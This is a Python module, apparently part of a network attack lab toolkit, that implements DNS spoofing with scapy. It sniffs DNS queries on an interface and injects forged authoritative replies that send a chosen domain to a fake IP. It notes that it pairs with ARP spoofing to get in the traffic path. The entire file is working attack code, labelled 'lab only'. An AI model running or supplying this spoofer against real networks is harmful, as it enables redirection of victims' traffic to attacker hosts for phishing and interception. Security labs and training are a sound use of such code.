"""DNS spoofing module (lab only)."""

from __future__ import annotations

import time
from typing import Any

from scapy.all import (  # type: ignore
    DNS,
    DNSQR,
    DNSRR,
    IP,
    UDP,
    Ether,
    sniff,
    sendp,
    conf,
)

from netlab.base import BaseModule, ModuleParam


class DnsSpoof(BaseModule):
    name = "dns_spoof"
    description = "DNS spoofing / cache poisoning (lab only)"
    category = "l3_l4"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(
                name="target_domain",
                type="str",
                label="Domain to spoof",
                required=True,
                description="e.g. example.com (queries for this will be poisoned)",
            ),
            ModuleParam(
                name="fake_ip",
                type="ip",
                label="Fake IP address",
                required=True,
            ),
            ModuleParam(
                name="interface",
                type="interface",
                label="Network interface",
                required=True,
            ),
            ModuleParam(
                name="duration",
                type="int",
                label="Duration (seconds)",
                required=False,
                default=60,
                description="0 = until Ctrl+C",
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        domain = params["target_domain"].lower().rstrip(".")
        fake_ip = params["fake_ip"]
        iface = params["interface"]
        duration = int(params.get("duration", 60))

        conf.iface = iface
        conf.verb = 0

        print(f"[dns_spoof] Spoofing '{domain}' → {fake_ip} on {iface}")
        print(f"  Duration: {duration if duration > 0 else '∞'}s")
        print("  (Requires being in the path — usually combined with ARP spoof)")

        start = time.time()

        def process_packet(pkt):
            if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
                return
            qname = pkt[DNSQR].qname.decode(errors="ignore").lower().rstrip(".")
            if domain not in qname and qname != domain:
                return
            if pkt[DNS].qr != 0:  # only requests
                return

            # Build spoofed response
            spoofed = (
                Ether(dst=pkt[Ether].src, src=pkt[Ether].dst)
                / IP(dst=pkt[IP].src, src=pkt[IP].dst)
                / UDP(dport=pkt[UDP].sport, sport=53)
                / DNS(
                    id=pkt[DNS].id,
                    qr=1,
                    aa=1,
                    qd=pkt[DNS].qd,
                    an=DNSRR(rrname=pkt[DNSQR].qname, ttl=60, rdata=fake_ip),
                )
            )
            sendp(spoofed, iface=iface, verbose=0)
            logger.add_packets(1, len(bytes(spoofed)))
            print(f"  Spoofed reply for {qname} → {fake_ip}")

        try:
            sniff(
                iface=iface,
                filter="udp port 53",
                prn=process_packet,
                store=0,
                timeout=duration if duration > 0 else None,
                stop_filter=lambda _: duration > 0 and (time.time() - start) >= duration,
            )
        except KeyboardInterrupt:
            print("\n[dns_spoof] Interrupted by user")

        print("[dns_spoof] Done")
